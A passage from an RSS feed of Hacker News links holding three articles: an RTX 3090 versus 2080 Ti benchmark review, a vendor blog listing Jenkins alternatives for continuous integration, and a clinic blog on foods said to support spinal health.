<p>Starting out with Microsoft Flight Simulator, I‚Äôve got the newer 3090 shown by the purple bars, and the older 2080 Ti shown by the red bars.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9ab446748.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9ab446748.webp">The three resolutions tested are on the left, starting from 1080p down the bottom, 1440p in the middle, and 4K up the top. In this test there was only a minor difference at 1080p, then the margin grows as we step up to higher resolutions. At 1440p the 3090 was 20% faster than the 2080 Ti, though this was the slowest result out of all 11 games tested at this resolution, then at 4K the 3090 was reaching 41% higher average frame rates.</p>
<p>Red Dead Redemption 2 was tested using the games benchmark tool.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9ac7d266c.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9ac7d266c.webp">Again there‚Äôs less of a difference at 1080p, as these higher end GPUs are better utilized at higher resolutions. At 1080p the 3090 was around 19% faster, but then at 4K the 3090 had a massive 57% lead - the biggest improvement seen out of all games that I‚Äôve tested.</p>
<p>Battlefield 5 was tested in campaign mode by running through the same mission on both graphics cards.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9ad9a7f6c.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9ad9a7f6c.webp">Interestingly the 2080 Ti actually had better 1% low results at 1080p, but this was the only time this happened. This game has a 200 FPS frame cap by default which the 3090 was hitting, so I suspect this may be why its 1% low was behind, given the 1% low on the 3090 was higher than this at 1440p. At 4K the 3090 is reaching a 45% higher average frame rate, even the 1% low from the 3090 is a fair amount ahead of the 2080 Ti‚Äôs average frame rate.</p>
<p>Shadow of the Tomb Raider was tested with the games built in benchmark.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9aece7811.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9aece7811.webp">The 2080 Ti was still delivering above 60 FPS in this test with the highest setting preset at 4K, but it‚Äôs no match for the 3090, which was again around 45% ahead. The difference is of course lower at lower resolutions, the 3090 is around 38% faster than the 2080 Ti at 1440p, then just 14% ahead at 1080p.</p>
<p>For Control I‚Äôll start with RTX off results.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9afcc4602.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9afcc4602.webp">At 1080p the 3090 has a modest 20% lead over the 2080 Ti, then a much higher 43% lead at 1440p, increasing further to a 53% higher average frame rate at 4K. The 3090 was still able to run the game well with above 60 FPS at 4K, making it a fair bit more playable compared to the 2080 Ti, at least with the highest setting preset that I‚Äôve tested.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9b1ee431b.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" data-src="/storage/posts/2020/09/5f6c9b1ee431b.webp">With RTX on and DLSS enabled the 3090 is now 35% faster than the 2080 Ti at 1080p, compared to 20% with RTX off. The differences are nowhere near as big at 1440p and 4K though, for instance at 4K in this test the 3090 is 55% ahead of the 2080 Ti, but then in the RTX off results shown earlier the 3090 was 53% ahead. Basically RTX and DLSS in this game is running better on the 3090 than the 2080 Ti, but outside of 1080p it‚Äôs not that much better.</p>
<p>I‚Äôve tested Metro Exodus with the game's benchmark tool.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9b4244c86.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" data-src="/storage/posts/2020/09/5f6c9b4244c86.webp">There are some nice gains with the 3090. At 4K we‚Äôre looking at a 45% higher average frame rate from the 3090, and around 25% higher at the lower 1080p resolution.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9b523b343.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9b523b343.webp">In Death Stranding the 3090 was giving me 1% lows that were ahead of the average frame rate of the 2080 Ti at 4K and 1440p resolutions, it was close at 1080p but not quite there. Like many other games, we‚Äôre around the 46% point in terms of average FPS improvement with the 3090 at 4K.</p>
<p>The Witcher 3 is still being tested as you guys still voted for it in a poll I ran recently.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9b62608cc.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9b62608cc.webp">This game saw the lowest difference between the two GPUs at 4K, though the 3090 still had a 40% higher average frame rate, and again the 1% lows from it were ahead of even the averages from the 2080 Ti at both 4K and 1440p.</p>
<p>Assassin‚Äôs Creed Odyssey was tested with the built-in benchmark, and is another one you guys voted to see more of.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9b77944ad.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9b77944ad.webp">The 3090 was 22% faster than the 2080 Ti at 1080p, 25% faster at 1440p, and 42% faster at 4K, so below average increases compared to the other games tested at the higher resolutions.</p>
<p>Call of Duty Modern Warfare was tested in campaign mode.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9b865cf9b.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9b865cf9b.webp">The 2080 Ti was still giving an above 60 FPS experience at 4K even with all settings maxed out, but once more the 3090 pushes things to the next level by averaging 100 FPS, a 43% improvement. This was another test where even the 3090‚Äôs 1% lows were ahead of the 2080 Ti‚Äôs averages.</p>
<p>Rainbow Six Siege was tested using the games benchmark tool with Vulkan.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9b9637819.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9b9637819.webp">The 2080 Ti was right on 144 FPS at 4K, so it‚Äôs probably still going to be pretty decent even if you actually have a high refresh 4K monitor, but the 3090 is again offering nice improvements, with a 48% higher average frame rate at this resolution, and it manages to push the 1080p result above 500 FPS, something I‚Äôve never seen before in this test.</p>
<h2>Overall gaming performance</h2>
<p>At 1080p on average over all 11 games tested the 3090 was under 22% faster than the 2080 Ti.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9bb2021a2.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9bb2021a2.webp">In some titles like flight simulator, down the bottom, we‚Äôre seeing a negligible difference, while others such as Control with RTX enabled at the top still had nice gains.</p>
<p>At 1440p the 3090 was now 36% faster than the 2080 Ti on average.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9bc3e0bf6.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9bc3e0bf6.webp">As higher resolutions can typically make better use of the GPU we‚Äôre starting to see what the 3090 is capable of. Flight simulator was still the lowest improvement out of what was tested, while Control was at the top again.</p>
<p>At 4K the 3090 is now almost 47% faster than the 2080 Ti on average.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9bd8eda28.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9bd8eda28.webp">This time Red Dead Redemption 2 was able to overtake Control for top spot with almost a 57% improvement, and even the worst result was still a 40% boost, so if you‚Äôre serious about 4K gaming something like the 3090 could be worth considering.</p>
<h2>Power usage</h2>
<p>When we look at total system power draw from the wall<img src="https://techplanet.today/storage/posts/2020/09/5f6c9beca71e2.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9beca71e2.webp">the PC with the 3090 installed was using around 29% more power, pushing the system to over 500 watts. I tested Control here, as we just saw it was around 53% faster in terms of average F PS, so 29% more power from the wall for a 53% boost to FPS, sounds reasonable to me.</p>
<h2>Cost per frame</h2>
<p>Let‚Äôs check out value in gaming in terms of dollar per frame.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9c00a4a28.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9c00a4a28.webp">If we consider that the 3090 is $1500 USD at launch, and the 2080 Ti was meant to be $1000, then that‚Äôs 50% more money for the 3090, but the 2080 Ti wasn‚Äôt really available at that price, so if we instead go with $1200 which is closer to what it was actually available for, then the 3090 is 25% more money. This of course doesn‚Äôt factor in that people have been fire selling their 2080 Ti‚Äôs in the lead up to the 3000 series release, at the moment it‚Äôs easy to score one for under $700 on the second hand market, so I‚Äôve listed that too.</p>
<p>The 3090 looks better than the 2080 Ti at $1200, but if you could actually get the 2080 Ti at $1000 in the past then the 3090 would be slightly worse from a dollar per frame perspective, and this is of course assuming the 3090 will be available at $1500, that‚Äôs still yet to be seen.</p>
<p>The 3090 isn‚Äôt exactly targeted towards gamers, but there‚Äôs no denying that it‚Äôs a beast in gaming. To get the most out of it though, you‚Äôre really going to want to focus on playing at higher resolutions like 1440p or 4K. If you‚Äôre a competitive 1080p gamer playing at competitive settings, in a lot of cases your CPU will probably matter more than going for a 3090 over some other decent but far cheaper GPU option. Even many GPU heavy titles tested here at 1080p didn‚Äôt see huge gains from the 3090.</p>
<h2>Content creation benchmarks</h2>
<p>I‚Äôve also tested both in content creator workloads, it‚Äôs not just all about gaming!<img src="https://techplanet.today/storage/posts/2020/09/5f6c9c4cb5297.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9c4cb5297.webp">I‚Äôve tested DaVinci Resolve with the Puget Systems benchmark, and the 3090 was scoring 42% higher than the 2080 Ti. Despite taking averages of 5 runs, the individual results were two to three hundred points different, so this might not be the most accurate test, hopefully by running it 5 times the results are decent but yeah it did vary between runs a fair bit.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9c5f966fe.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9c5f966fe.webp">I‚Äôve tested the V-Ray benchmark and saw massive gains from the 3090, which was scoring 119% higher than the 2080 Ti. This is testing compute power, and if you recall the 3090 has 141% more CUDA cores, so this sort of gain is expected in this type of workload.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9c6d089a3.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9c6d089a3.webp">Blender was tested with the Open Data Benchmark with the BMW and Classroom tests. This is also relying more on compute power, I selected the CUDA option when running the test, and the 3090 was completing these tasks 125% faster than the 2080 Ti, another serious win.</p>
<h2>Summary</h2>
<p>In Compute heavy workloads the 3090 is able to offer significant gains, so it really comes down to what you plan on running and of course your budget, as we saw this does not translate quite as well into gaming performance, though gaming performance was still a nice step up over the 2080 Ti at higher resolutions.</p>
<p>I‚Äôd be interested to hear in the comments if you‚Äôre considering the 3090, let me know what you plan on using it for. In gaming the RTX 3080 will be far better value at half the price and will be a much better sweet spot for many gamers, I‚Äôve got one of those in the ‚Ä¶</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://techplanet.today/post/rtx-3090-vs-2080-ti-worth-upgrading">https://techplanet.today/post/rtx-3090-vs-2080-ti-worth-upgrading</a></em></p>]]>
            </description>
            <link>https://techplanet.today/post/rtx-3090-vs-2080-ti-worth-upgrading</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578375</guid>
            <pubDate>Thu, 24 Sep 2020 13:24:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[13 Jenkins Alternatives for Continuous Integration]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24578372">thread link</a>) | @savovaleks
<br/>
September 24, 2020 | https://microtica.com/13-jenkins-alternatives-for-continuous-integration/ | <a href="https://web.archive.org/web/*/https://microtica.com/13-jenkins-alternatives-for-continuous-integration/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div>
<p>In our <a href="https://microtica.com/jenkins-is-old-we-need-an-alternative/">previous article</a>, we discussed <strong>the most common problems with Jenkins</strong> that made us search for an alternative. That‚Äôs why in this article, we‚Äôre offering a list of the most common Jenkins alternatives for continuous integration.&nbsp;</p>



<h2>BuildMaster</h2>



<div><figure><img src="https://lh5.googleusercontent.com/7RJeoqHKUEfkCx1d0sOotEDM3wsjPPBuEGIVclg-M2cD7cdfzdGXQgqfKDXCbHwnPDmj8-BfcDM_6seuxVgBzVw9K--kLkgOM3P9wEYNJ98H5geeOPmKDMkRCJAXOITHtqDe4Ek" alt=""></figure></div>



<p><a href="https://inedo.com/buildmaster/download">BuildMaster</a> by Inedo is one of the Jenkins alternatives that enables developers to release software to any environment. Offering fully-functional continuous integration abilities for different platforms, the tool gives organizations the possibility to create their own self-service release management platforms. Teams can handle their own apps and deploy to their environments independently. What is more, it prevents the release of untested software with automated gates. <a href="https://www.g2.com/products/buildmaster/reviews">Users</a> are very happy with its simplicity, as you don‚Äôt have to be an expert to set up pipelines.&nbsp;</p>



<h2>Microtica</h2>



<div><figure><img src="https://lh4.googleusercontent.com/HgVVjaV2Z_Zoz3Cc9LvrMh1N0EtzjTeNlgQwCuxISUSIbxG0ywqqJpiwpnbtiy91gRUGpcPtyGXBNIwf43aVAM-D7CCB3YYZfhBtRM92K7StioG60loAQV7xFCMB44HgHct535U" alt=""></figure></div>



<p><a href="https://microtica.com/">Microtica</a> is a DevOps automation tool that covers the entire software delivery process, from setting up a cloud infrastructure to delivering apps and services to the cloud using Kubernetes. Microtica‚Äôs ready-to-use components provide users with reusable pieces of code that require no additional coding and can help you create an infrastructure within minutes.&nbsp;</p>



<p>Thanks to the microservice generator, developers can set up microservices automatically. With integrated production-ready Kubernetes and the native Kubernetes dashboard, they can create scalable apps in a few clicks.</p>



<p>Microtica‚Äôs pipelines define the workflow of every component and microservice. Users can trigger them automatically or manually to get an overview of their build process at any time. They can perform all actions without leaving the Microtica web portal, with Slack notifications for every change.&nbsp;</p>



<p>Finally, Microtica allows developers to automate their sleep cycles and therefore reduce AWS costs. Once they activate the saving mode, Microtica goes autopilot and prevents excessive spending. Moreover, all savings are available in the cost-savings dashboard.</p>



<p>This is obviously the tool we like the most because it‚Äôs the one we created üôÇ So, we‚Äôd be really happy if you‚Äôd try our free version and tell us what you think.&nbsp;</p>



<h2>GitLab</h2>



<div><figure><img src="https://lh3.googleusercontent.com/gPIzZYmhZZVRe6RR-QwbCaAe6C2Iw6ndcr6m9m3ukvhBIPLDIDY-an6e3gsUFsTE2fQxKZEXw67-dxWLmAxnVnJ1kO0expghabPO0q_OMKcHOhDE62EAbkH7lB41L0TYyALIQ5U" alt="" width="183" height="195"></figure></div>



<p><a href="https://about.gitlab.com/">GitLab</a> is a cloud-based CI platform that lets dev teams handle their diverse toolchains, speed, and security more efficiently. It allows organizations to plan, build, and administer code safely from a centralized and unified version control system. Moreover, GitLab enables users to artifacts, handle containers, and package applications and dependencies, using Docker and Kubernetes. <a href="https://www.capterra.com/p/159806/GitLab/#reviews">Reviews</a> say that GitLab is easy to integrate. However, it can sometimes have some annoying bugs and limitations, as well as some missing features for full automation.&nbsp;</p>



<h2>CircleCI</h2>



<div><figure><img src="https://lh3.googleusercontent.com/rz_QXI01Ryi8ScKYwGj6lWG6ZEwvU0_u2hhPnBol5sCAXkrEwWgX0kNWTMvOrwwY6pi_ok7zwqwcCI2moGUMkXQcrIyWXci-3dBhsTuuyuBehGTc-ncptksCnxqbJ7ET0uCYkpA" alt="" width="159" height="137"></figure></div>



<p><a href="https://circleci.com/">Circle CI</a> is one of the scalable Jenkins alternatives that run in any environment such as a Python API server or Docker cluster. This tool removes vulnerabilities and strengthens the application‚Äôs consistency. It supports various languages, like C++, NET, JavaScript, PHP, Ruby, and Python. Furthermore, queued and running builds can be automatically canceled when a more recent build gets triggered. It can integrate with GitHub, GitHub Enterprise, and Bitbucket. According to <a href="https://www.trustradius.com/products/circleci/reviews#2">users on TrustRadius</a>, automated builds are the best benefit from CircleCI, but jobs can sometimes take too long.&nbsp;</p>



<h2>Bamboo</h2>



<div><figure><img src="https://lh3.googleusercontent.com/X49nGzFlAo4jvAfof1xsuERUHkTXwjjCURDlhGYis5wDCev9t8MsnkELcCVEmugi7k7A0G-4CDqvnyh9Pj8eTBHXLaN8nGCqypg4BrLc-pi8zOnqP4Sqgn93gQIUsAWX8TBbJ5I" alt=""></figure></div>



<p><a href="https://www.atlassian.com/software/bamboo">Bamboo</a> by Atlassian is a continuous integration server that automatically creates, monitors, and releases from one place. It easily integrates with JIRA applications and Bitbucket. Also, Bamboo integrates with Docker, Git, SVN, and Amazon S3 buckets. Based on changes detected in the repository, it can trigger builds and push notifications from Bitbucket. It‚Äôs available both hosted and on-premise. <a href="https://www.g2.com/products/bamboo/reviews#survey-response-3456530">G2 users</a> say that the visibility of the build process with Bamboo is great, but some concepts and integrations are unclear.&nbsp;</p>



<h2>TravisCI</h2>



<div><figure><img src="https://lh3.googleusercontent.com/Duk5Doz83Tz31MIjqteYqVVZd8LFU3Ww-ghBShCMnD8oP_w8fsE5G8SkC_DSc-bKbZ-Bpe7HK50qwBRjdC2T6wuEchuII2HK-zeorNhUcyPo-Xj6-lyu-EN_y6F8NT5hqEBIpEY" alt="" width="448" height="140"></figure></div>



<p><a href="https://travis-ci.org/">TravisCI</a> is a continuous integration hosting service that developers can use to develop and validate GitHub and Bitbucket-hosted applications programs. It can test all pull requests to make sure no untested code is released. You can simply log in with GitHub to set up your project. Includes pre-installed databases and resources that can quickly be activated in configuration build. According to some online reviews, TravisCI is great if you‚Äôre working on a small project and want to start building quickly. However, when you have a larger project that requires taking care of dependencies and performance and reliability of the builds, then you‚Äôll probably run into some problems.&nbsp;</p>



<h2>Semaphore</h2>



<div><figure><img src="https://lh5.googleusercontent.com/MlQ02T21ok5r5z-Uum17s4x-nTcUTS_KyPDyws_8ZTwJYaTCEZt8AMmMf82mEx-fPqwrzmc7Gf13VGriBsF-s6MNCUA93Akg7asMsVUrB1l2OAxUg9Z2sRDIbJz5kE-L7V_oISY" alt=""></figure></div>



<p><a href="https://semaphoreci.com/product">Semaphore</a> is one of the Jenkins alternatives that covers the entire CI/CD process that supports GitHub, Kubernetes, iOS, Docker, Kubernetes, and has over 100 tools preinstalled. It can automate any continuous delivery pipeline and provide control with customizable stages, parallel execution, dependency management, etc. According to <a href="https://www.capterra.com/p/171934/Semaphore/reviews/">online reviews</a>, Semaphore builds are very fast, and the platform is easy to set up. However, users say that the UI can sometimes be confusing and that there‚Äôs a limited implementation of deployment pipelines.&nbsp;</p>



<h2>Buddy</h2>



<div><figure><img src="https://lh5.googleusercontent.com/CKrINv1ah_TxJVnlz7a_5cDnZfgKd7dBYdIJmjrh0zV58yuAn8iD52Hh6auiEOBo9yDw9fbT09Qdpilb1K_4vHC8Tic9IBfWS8brON8Ku8v5bo3GMg0gGOlALsgHFTEY8nb-3uU" alt=""></figure></div>



<p><a href="https://buddy.works/">Buddy</a> is a CI/CD platform that reduces the effort of configuring and maintaining Jenkins with a simple UI/UX that makes it very simple to create, evaluate, and deploy better applications.&nbsp;</p>



<p>You can perform configuration in 15 minutes via GUI with instant YAML export. It‚Äôs available in cloud and on-premises, with full Docker and Kubernetes support. <a href="https://alternativeto.net/software/buddy-/reviews/">Online reviews</a> say that Buddy is very easy to set up, but its paid tiers are too expensive.&nbsp;</p>



<h2>Drone.io</h2>



<div><figure><img src="https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/09/image.png" alt="Drone | Brands DA - DZ" width="326" height="125" srcset="https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/09/image.png 362w, https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/09/image-300x115.png 300w" sizes="100vw"></figure></div>



<p><a href="https://drone.io/">Drone.io</a> is a self-service CD platform that uses a simple YAML configuration file and a superset of docker-compose to create and execute pipelines in Docker containers. It executes every pipeline step within a separate Docker container that is automatically downloaded at runtime. Drone is bundled as a Docker image and it can be downloaded from Dockerhub. <a href="https://www.g2.com/products/drone-io/reviews">Online reviews</a> say that Drone.io is one of the Jenkins alternatives that‚Äôs easy to set up and a great solution for enterprises, but it lacks some features and needs further customization.&nbsp;</p>



<h2>GoCD</h2>



<div><figure><img src="https://lh6.googleusercontent.com/6hxo5wQ77vnHzW-S-coYUBsABY_ipsCkmmDX0yKRAiDmgpgCLTUsHJslXER1GgKF0EbD808x15X4UfTwzYvSwwzn4oiUG73M8LHznBP_cNuQPrA1N2iICw0K7mAr5YRD3lL4w9k" alt=""></figure></div>



<p><a href="https://www.gocd.org/">GoCD</a> is a Continuous Integration open-source server. You can use it to simplify the simulation and visualization of dynamic workflows. This CI tool offers continuous delivery and elegant design to construct CD pipelines. It supports parallel and sequential execution, with the possibility to deploy any version at any time. It has an active and supportive community. According to users, GoCD isn‚Äôt compatible with scaling across multiple servers, but one of its good sides is that you can customize your own processes.&nbsp;</p>



<h2>TeamCity</h2>



<div><figure><img src="https://lh5.googleusercontent.com/ACXxU9tL9vcrQ1AoDN2Bbk4LZITTgN8zFd1mq5ElkpOvtSgWRkcS1o2LRup4DDe-vTWxQqSKfPu0Ya_5cymaMW4g3WgHuRzXccqK6BYC-tcR4VNhaIAo73vS96IUNSL-k3CkpLg" alt=""></figure></div>



<p><a href="https://www.jetbrains.com/teamcity/">TeamCity</a> is a CI/CD tool by JetBrains. It allows users to build, monitor, and run automated tests before code commits, maintaining a clean codebase. It provides comprehensive VCS integration, keeping the CI server healthy at all times, even when there aren‚Äôt any builds running.&nbsp; It‚Äôs integratable with Amazon EC2, Microsoft Azure, and VMware vSphere. <a href="https://www.g2.com/products/teamcity/reviews">Online reviews</a> say that TeamCity is a modern, robust and transparent solution that provides a developer-friendly environment for your pipelines. However, you need to be careful with server configuration.</p>



<h2>Buildkite</h2>



<div><figure><img src="https://lh4.googleusercontent.com/b22Y4J3re1L6-vznnnCz3mXflqv5vo7WD4nGPSxJiR9-DXccvMfJrRXnsOYQ_8dpnNAfSmEFccEmM2GtyX8fXcv8YskUJdwTzOZ0sQSUPFq3ReFL3UmuYMuriQODoNjLTVIegH0" alt=""></figure></div>



<p><a href="https://buildkite.com/">Buildkite</a> is an open-source platform where you can run CI pipelines. It provides source control integration, chat support, and requires no source code access. You can schedule builds through their infrastructure as code system, allowing you to monitor and control all your pipelines through their web platform. However, the platform lacks some DevOps processes like source code management and security testing.&nbsp;</p>



<h2>Zuul</h2>



<div><figure><img src="https://lh4.googleusercontent.com/X9SpiEJTe_99orU93HnwqsFRoDXEG-tLlpUJwCgq-VQw62Dp3NR3q0Nak4JzOX1jirAZzE8fy_3oT6SErLWo_TZJ9ucdOKE2fVIJecWpiINKi5WZ8-sVQWhSQ4k4hOZfPKDrD8I" alt="" width="374" height="195"></figure></div>



<p>Zuul is an open-source CI tool that mainly resolves the issues that Jenkins has with CI testing. They are providing the ability to test serialized future states faster than it was possible. Their main difference is that they can test code across numerous repositories that work toward a common goal to make sure that a change will not pass to production if it breaks its own project or if it breaks a different project. This is called co-gating.&nbsp;</p>



<p>Over the years Zuul‚Äôs become a tool for automatic merging, building, and testing of any new changes made to a project. It‚Äôs ideal for enterprise-grade organizations to build a large number of projects that must work in synchrony with each other.</p>



<h2>Conclusion</h2>



<p>Jenkins is a tool that many dev teams still use. However, it‚Äôs not the only CI tool anymore. Seeking to improve the way you work constantly means playing with multiple methods that will help you do your job easier, quicker, and more consistently. Don‚Äôt risk your competitive advantage by ignoring innovation and remaining with traditional methods.&nbsp;</p>
<!--<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
			xmlns:dc="http://purl.org/dc/elements/1.1/"
			xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
		<rdf:Description rdf:about="https://microtica.com/13-jenkins-alternatives-for-continuous-integration/"
    dc:identifier="https://microtica.com/13-jenkins-alternatives-for-continuous-integration/"
    dc:title="13 Jenkins Alternatives for Continuous Integration"
    trackback:ping="https://microtica.com/13-jenkins-alternatives-for-continuous-integration/trackback/" />
</rdf:RDF>-->
</div></article></div>]]>
            </description>
            <link>https://microtica.com/13-jenkins-alternatives-for-continuous-integration/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578372</guid>
            <pubDate>Thu, 24 Sep 2020 13:24:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Foods You Need to Be Eating for Spinal Health]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24578356">thread link</a>) | @whereistimbo
<br/>
September 24, 2020 | https://www.csiortho.com/blog/2018/september/7-foods-you-need-to-be-eating-for-spinal-health/ | <a href="https://web.archive.org/web/*/https://www.csiortho.com/blog/2018/september/7-foods-you-need-to-be-eating-for-spinal-health/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemprop="articleBody"><p>Have you been experiencing spinal issues lately? Or are you looking for ways to prevent them? Believe it or not, the foods you eat can play a role in spine health.</p><p>Certain foods are packed with what your back needs in order to remain healthy and strong. So good back health can start with making the right food choices.</p><p>Avoiding bad foods is one way to increase health. Choosing the right ones is the best way to go.</p><p>What foods are best for spine health? Keep reading to find out. Here are eight foods that will help keep your spine strong and healthy.</p><h2 data-fontsize="36" data-lineheight="54">1. Plant-Based Proteins</h2><p>The proteins you get from certain plants are great for your spine health. These proteins are different than the ones found in meat.</p><p>Stick to plant-based proteins as much as possible. Animal-based proteins can lead to inflammation.</p><p>Instead, get your protein from foods like chia seeds, lentils, and beans. Not only do they provide protein, they pack a nutritional punch in other ways, too. You‚Äôll get a variety of helpful antioxidants, fiber, vitamins, and minerals as well.</p><p>If you‚Äôd still like to get some animal-based protein in your diet, go for lean picks. This means choosing chicken and fish over beef and pork.</p><h2 data-fontsize="36" data-lineheight="54">2. Vegetables</h2><p>Vegetables are good for you in general, so make sure you get a lot of them each day to improve your overall health. While healthy all around, veggies are also great for fighting back issues.</p><p>Certain vegetables contain properties that will help fight spinal issues.</p><p>Kale, broccoli, and spinach work well against inflammation. Each of these vegetables also contains nutrients that will help strengthen your spine. As the literal backbone of your body‚Äôs skeletal system, your spine can use all the nutritional help it can get.</p><p>As a rule of thumb, veggies with strong natural pigments are best.</p><h2 data-fontsize="36" data-lineheight="54">3. Salmon</h2><p>If you‚Äôre not opposed to seafood, add some salmon to your diet regularly. Salmon is a great source of lean protein, as well as well as another helpful nutrient: omega-3 fatty acids.</p><p>Omega-3 fatty acids promote bone and tissue health. They also fight against inflammation, just like those leafy green vegetables mentioned above.</p><p>Luckily, salmon is versatile and tasty when prepared the right way. There are plenty of fantastic salmon dishes for you to try. They‚Äôll spice up your menu and benefit your back at the same time.</p><h2 data-fontsize="36" data-lineheight="54">4. Dairy Products</h2><p>Calcium is super important for maintaining and improving bone health. The easiest way to get extra calcium in your diet without taking a supplement? Increase your dairy intake.</p><p>Don‚Äôt choose just any dairy products, though. Specifically, go for the ones that are high in calcium. Cheese, milk, and yogurt all fall into this category.</p><p>Like with many other food groups, though, you can overdo it with dairy. Don‚Äôt binge on your favorite cheese with the excuse of needing the extra calcium. Be smart about&nbsp;<a target="_blank" href="https://www.verywellhealth.com/healthy-alternatives-to-full-fat-dairy-products-697778">how you eat dairy products</a>&nbsp;so you don‚Äôt get too much fat or cholesterol in your diet.</p><p>Calcium can be found in other foods, too. Among them are those leafy green vegetables we‚Äôve already talked about.</p><h2 data-fontsize="36" data-lineheight="54">5. Herbs and Spices</h2><p>Many herbs and spices are great for promoting spinal health. Turmeric, a spice commonly used in Indian cuisine, including curry dishes, helps fix damaged tissue.</p><p>There are herbs that fight inflammation as well. These include cinnamon, rosemary, basil, and ginger.</p><p>Add these and other healthy spices and herbs to your recipes throughout the day. Or use them to create a healthy, delicious herbal tea. Herbal teas help strengthen your immune system,&nbsp;<a href="https://www.csiortho.com/spine-treatments/interventional-treatment/spinal-cord-stimulators/">reduce inflammation</a>, and taste great at the same time.</p><h2 data-fontsize="36" data-lineheight="54">6. Fruits</h2><p>Just like vegetables, you should go for the highly-pigmented types here. And like dairy, you don‚Äôt want to overdo it. Remember, fruit is sugar, so eating too much can be more of a detriment to your health than a benefit.</p><p>While you need to be responsible when eating fruits, they have many health benefits.</p><p>Berries are particularly great for your spinal health. They‚Äôre packed with antioxidants and nutrients that will help your spine get and stay healthy.</p><p>So add those berries to breakfasts, dinners, lunches, you name it. You can even use them as dessert.</p><h2 data-fontsize="36" data-lineheight="54">7. Avocados</h2><p>Whether you‚Äôre a fan of avocados or not, they‚Äôre great for your spine. They‚Äôre full of healthy fats that your body needs as well as fiber and potassium. These things make avocados great for your health overall.</p><p>Whether it‚Äôs good fat or not, avocados are fatty foods, so make sure you don‚Äôt overdo it.</p><p>If you don‚Äôt like avocados, try using them in ways you haven‚Äôt before. In recent years tons of recipes have emerged for avocado toast, addition to a smoothie and other tasty meals. You don‚Äôt have to limit yourself to a plain slice with a salad or a guacamole dip.</p><p>One of the greatest things about avocados? They help to reduce back pain.</p><h2 data-fontsize="36" data-lineheight="54">Eat Your Way to Great Spine Health</h2><p><a href="https://www.csiortho.com/blog/2018/july/10-exercises-you-should-use-to-recover-from-a-ba/">Exercises</a>&nbsp;and medicine may be your first thoughts when it comes to remedies for spinal issues, but you can eat your way to good health too. You just have to choose foods that are great for your body, particularly for your spine.</p><p>Spinal health is so important for your day-to-day interactions. So give yourself a leg up by packing your diet with these seven healthy foods. They‚Äôll help improve your spine health, as well as your health overall.</p><p>Are you interested in trying physical therapy to help with your back pain? Contact us to&nbsp;<a 